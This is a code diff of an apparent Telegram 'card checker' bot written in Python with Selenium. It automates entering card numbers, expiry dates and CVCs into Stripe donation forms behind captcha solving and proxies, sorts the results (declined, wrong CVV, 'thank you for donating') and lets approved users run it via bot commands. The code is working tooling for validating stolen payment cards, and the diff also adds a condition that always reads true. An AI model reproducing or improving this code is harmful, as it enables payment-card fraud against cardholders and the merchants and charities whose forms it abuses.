@@ -22,7 +22,7 @@ import random
 import nopecha
 from requests.auth import HTTPProxyAuth
 
-nopecha.api_key = 'sub_1P70HTCRwBwvt6ptLlvvMWOv'
+nopecha.api_key = 'NOPECHA_KEY'
 
 
 
@@ -33,7 +33,7 @@ APPROVED_USERS_FILE = 'approved_users.json'
 ADMIN_USER_ID = [5457445535,5737829871,5589703594,1068646598,660344203,1131430680,1047973309]
 
 def send_ping():
-    bot_token = 'BOT TOKEN'
+    bot_token = 'BOT_TOKEN'
     while True:
         try:
             response = requests.get(f'https://api.telegram.org/bot{bot_token}/getMe')
@@ -1006,41 +1006,66 @@ def process_line(line):
     return a, b, c
 
 def cc_num(driver, a, b, c):
-    iframe = WebDriverWait(driver, 10).until(
-        EC.presence_of_element_located((By.CSS_SELECTOR, 'iframe[name^="__privateStripeFrame"]'))
-    )
-    driver.switch_to.frame(iframe)
-    print(a, b, c)
+    try:
+        # Locate the iframe and switch to it
+        iframe = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, 'iframe[name^="__privateStripeFrame"]'))
+        )
+        driver.switch_to.frame(iframe)
+        print(a, b, c)
 
-    # Simulate real user input by sending keys with a slight delay
-    card_number = WebDriverWait(driver, 10).until(
-        EC.presence_of_element_located((By.NAME, 'cardnumber'))
-    )
-    card_number.click()
-    for char in a:
-        card_number.send_keys(char)
-        time.sleep(0.1)
+        # Fill in card number
+        card_number = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.NAME, 'cardnumber'))
+        )
+        card_number.click()
+        for char in a:
+            card_number.send_keys(char)
+            time.sleep(0.1)
 
-    exp_date = driver.find_element(By.NAME, 'exp-date')
-    exp_date.click()
-    for char in b:
-        exp_date.send_keys(char)
-        time.sleep(0.1)
-    cvc = driver.find_element(By.NAME, 'cvc')
-    cvc.click()
-    for char in c:
-        cvc.send_keys(char)
-        time.sleep(0.1)
-    time.sleep(7)
-    webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()
-    time.sleep(15)
-    driver.switch_to.default_content()
-    error_message_div = WebDriverWait(driver, 10).until(
-        EC.presence_of_element_located((By.XPATH, '//*[@id="ffc_app_instance_1"]/div/div/div[1]/div/div[8]/div[2]/div'))
-    )
-    error_message = error_message_div.text
-    print(f"Error message: {error_message}")
-    return error_message
+        # Fill in expiration date
+        exp_date = driver.find_element(By.NAME, 'exp-date')
+        exp_date.click()
+        for char in b:
+            exp_date.send_keys(char)
+            time.sleep(0.1)
+
+        # Fill in CVC
+        cvc = driver.find_element(By.NAME, 'cvc')
+        cvc.click()
+        for char in c:
+            cvc.send_keys(char)
+            time.sleep(0.1)
+
+        time.sleep(7)
+
+        # Switch back to default content and check for error message
+        driver.switch_to.default_content()
+        try:
+            error_message_div = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located(
+                    (By.XPATH, '//*[@id="ffc_app_instance_1"]/div/div/div[1]/div/div[8]/div[2]/div')
+                )
+            )
+            error_message = error_message_div.text
+            print(f"Error message: {error_message}")
+            return error_message
+        except:
+            # If no error message found, attempt to submit the form
+            webdriver.ActionChains(driver).send_keys(Keys.ENTER).perform()
+            time.sleep(15)
+            driver.switch_to.default_content()
+            error_message_div = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located(
+                    (By.XPATH, '//*[@id="ffc_app_instance_1"]/div/div/div[1]/div/div[8]/div[2]/div')
+                )
+            )
+            error_message = error_message_div.text
+            print(f"Error message: {error_message}")
+            return error_message
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return str(e)
 
 def update_message(context, chat_id, message_id, card_status):
     message_text = ""
@@ -1089,10 +1114,15 @@ def process_card(context, chat_id, message_id, card_status, idx, card_details, t
         error_message = cc_num(driver, a, b, c)
 
         # Checking the error message for specific keywords
-        if 'decline' in error_message.lower():
+        if 'confirming' in error_message.lower():
+            card_status[idx]['result'] = "Card in Process"
+            time.sleep(10)
+        if 'decline' or 'stacktrace' in error_message.lower():
             result_message = '❌ Card Declined'
         elif 'incorrect' in error_message.lower():
-            result_message = "⚠️Your Card's Cvv is incorrect"
+            result_message = f"⚠️ {error_message.lower()}"
+        elif 'too many requests' in error_message.lower():
+            result_message = '❌ Flooding By User. Skipped Card'
         else:
             result_message = '✅ Thank you for donating'
 
@@ -1400,7 +1430,7 @@ def payu_donate_command(update: Update, context: CallbackContext):
 
     threading.Thread(target=payu_process_donation, args=(update, context, card_details)).start()
 def main():
-    updater = Updater('BOT TOKEN', use_context=True)
+    updater = Updater('BOT_TOKEN', use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("c", cc_command))
     dp.add_handler(CommandHandler("approve", approve_command))
